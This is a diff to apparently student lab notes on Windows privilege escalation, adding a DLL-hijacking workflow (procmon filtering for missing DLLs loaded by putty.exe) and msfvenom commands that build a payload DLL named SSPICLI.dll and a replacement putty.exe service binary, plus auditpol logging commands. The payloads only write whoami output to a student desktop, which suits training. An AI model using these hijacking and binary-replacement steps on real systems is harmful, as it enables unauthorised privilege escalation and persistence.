@@ -802,6 +802,8 @@ Create and transfer Malicious DLL
 wmic service list full
 sc query
 ```
+# Windows 
+```
 sc.exe to create service
 sc.exe create puttyService binPath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService start=auto
 open task scheduler
@@ -813,4 +815,17 @@ net use z: "\\http://live.sysinternals.com" /persistent:yes
 cd z:
 ./procmon.exe -accepteula
 filter -> process name contains putty.exe -> path contains dll -> result is NAME NOT FOUND
-if does not work run: (get-process | ?($_.name -like "putty")).kill()
+if does not work run: (get-process | ?{$_.name -like "putty"}).kill()
+find a dll in the same directory as the file 
+example of a payload
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+for services
+sudo msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe > putty.exe
+```
+# Audit Logging
+```
+Show all audit category settings
+auditpol /get /category:*
+What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+```
